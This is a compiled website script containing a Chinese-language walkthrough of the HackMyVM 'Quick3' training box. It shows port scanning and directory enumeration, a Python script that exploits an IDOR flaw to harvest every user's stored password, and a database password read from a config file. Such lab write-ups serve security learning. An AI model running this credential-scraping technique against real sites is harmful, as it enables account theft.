"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2683],{82851:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>r,toc:()=>u});var i=t(74848),s=t(28453);const a={sidebar_position:10,tags:["Easy","Linux","IDOR","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u5bc6\u7801\u91cd\u7528"],title:"Quick3",description:"Quick3"},o="Quick3",r={id:"box/HackMyVM/Quick3",title:"Quick3",description:"Quick3",source:"@site/docs/box/HackMyVM/Quick3.md",sourceDirName:"box/HackMyVM",slug:"/box/HackMyVM/Quick3",permalink:"/docs/box/HackMyVM/Quick3",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"IDOR",permalink:"/docs/tags/idor"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"\u5bc6\u7801\u91cd\u7528",permalink:"/docs/tags/\u5bc6\u7801\u91cd\u7528"}],version:"current",sidebarPosition:10,frontMatter:{sidebar_position:10,tags:["Easy","Linux","IDOR","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u5bc6\u7801\u91cd\u7528"],title:"Quick3",description:"Quick3"},sidebar:"boxSidebar",previous:{title:"Quick2",permalink:"/docs/box/HackMyVM/Quick2"},next:{title:"Quick4",permalink:"/docs/box/HackMyVM/Quick4"}},c={},u=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"HTTP - 80",id:"http---80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"mike --&gt; root",id:"mike----root",level:3}];function l(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"quick3",children:"Quick3"}),"\n",(0,i.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# nmap -sTCV -p- --min-rate 1000 192.168.0.102\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 06:21 EDT\nNmap scan report for espo.hmv (192.168.0.102)\nHost is up (0.022s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)\n|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Quick Automative - Home\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nMAC Address: 08:00:27:28:12:35 (Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.56 seconds\n"})}),"\n",(0,i.jsx)(n.h2,{id:"http---80",children:"HTTP - 80"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.0.102/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 278]\n/.php                 (Status: 403) [Size: 278]\n/img                  (Status: 301) [Size: 312] [--\x3e http://192.168.0.102/img/]\n/images               (Status: 301) [Size: 315] [--\x3e http://192.168.0.102/images/]\n/index.html           (Status: 200) [Size: 51414]\n/modules              (Status: 301) [Size: 316] [--\x3e http://192.168.0.102/modules/]\n/css                  (Status: 301) [Size: 312] [--\x3e http://192.168.0.102/css/]\n/lib                  (Status: 301) [Size: 312] [--\x3e http://192.168.0.102/lib/]\n/js                   (Status: 301) [Size: 311] [--\x3e http://192.168.0.102/js/]\n/customer             (Status: 301) [Size: 317] [--\x3e http://192.168.0.102/customer/]\n/404.html             (Status: 200) [Size: 5013]\n/fonts                (Status: 301) [Size: 314] [--\x3e http://192.168.0.102/fonts/]\n/.php                 (Status: 403) [Size: 278]\n/.html                (Status: 403) [Size: 278]\n/server-status        (Status: 403) [Size: 278]\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n===============================================================\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u8fdb\u884c\u626b\u63cf\u4e4b\u540e\u5f00\u59cb\u8bbf\u95ee, \u53d1\u73b0\u5728 ",(0,i.jsx)(n.code,{children:"customer"})," \u662f\u4e00\u4e2a\u767b\u9646\u7a97\u53e3\u53ef\u4ee5\u8fdb\u884c\u6ce8\u518c, \u5728\u6ce8\u518c\u4e4b\u540e\u53ef\u4ee5\u8fdb\u884c\u8bbf\u95ee\u64cd\u4f5c, \u540c\u65f6\u5728\u67e5\u770b\u7528\u6237\u7684\u8d44\u6599\u754c\u9762\u53ef\u4ee5\u770b\u5230\u7528\u6237\u7684\u540d\u79f0\u3001\u90ae\u7bb1\u3001\u5bc6\u7801\u8fd9\u4e9b\u5185\u5bb9, \u540c\u65f6\u6211\u53d1\u73b0\u5176\u5b58\u5728 IDOR \u6f0f\u6d1e\n",(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417192307.png",alt:""}),"\n\u968f\u540e\u7f16\u5199\u811a\u672c\u6765\u6279\u91cf\u83b7\u53d6\u5185\u5bb9, \u4ece\u800c\u83b7\u53d6\u5230\u6240\u6709\u7684\u8d26\u53f7\u5bc6\u7801"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"import requests\nfrom bs4 import BeautifulSoup\n\nheaders = {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\n    'Accept-Language': 'zh-CN,zh;q=0.9',\n    'Cache-Control': 'no-cache',\n    'Cookie': 'PHPSESSID=sqcaqeuhr6iuh5if6qu93fuj9f',\n    'Pragma': 'no-cache',\n    'Proxy-Connection': 'keep-alive',\n    'Upgrade-Insecure-Requests': '1',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',\n}\n\ndef request():\n    for i in range(1, 30):\n        url = \"http://192.168.0.102/customer/user.php?id=\" + str(i)\n        response = requests.get(url, headers=headers, verify=False).text\n        soup = BeautifulSoup(response, 'html.parser')\n        name_email = soup.find(class_=\"contact_inner\")\n        name = name_email.find(\"h3\").text\n        email = name_email.find(\"ul\").findChild(\"li\").text.replace(\" : \", \"\")\n        password = soup.find(id=\"passwordForm\").find('input', {'name': 'oldpassword'})[\"value\"]\n        print(\"name: \" + name + \"\\temail: \" + email + \"\\tpassword: \" + password)\n\nif __name__ == '__main__':\n    request()\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5728\u83b7\u53d6\u5230\u5bc6\u7801\u4e4b\u540e\u968f\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5176\u4e2d\u4e00\u4e2a\u8d26\u53f7\n",(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417192422.png",alt:""})]}),"\n",(0,i.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,i.jsx)(n.h3,{id:"mike----root",children:"mike --\x3e root"}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u767b\u9646\u4e4b\u540e, \u524d\u5f80\u7f51\u7ad9\u7ba1\u7406\u76ee\u5f55\u53ef\u4ee5\u770b\u5230\u6570\u636e\u5e93\u7684\u914d\u7f6e\u6587\u4ef6\u8fd9\u91cc\u5b58\u5728\u5bc6\u7801\u91cd\u7528\u7684\u95ee\u9898"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"mike@quick3:~$ cat /var/www/html/customer/config.php\n<?php\n// config.php\n$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');\n\n// Check connection\nif ($conn->connect_error) {\n        die(\"Connection failed: \" . $conn->connect_error);\n}\n?>\n"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u540c\u65f6\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5b58\u5728\u4e00\u4e9b\u9650\u5236\u4e0d\u80fd\u4f7f\u7528 cd \u64cd\u4f5c"}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var i=t(96540);const s={},a=i.createContext(s);function o(e){const n=i.useContext(a);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),i.createElement(a.Provider,{value:n},e.children)}}}]);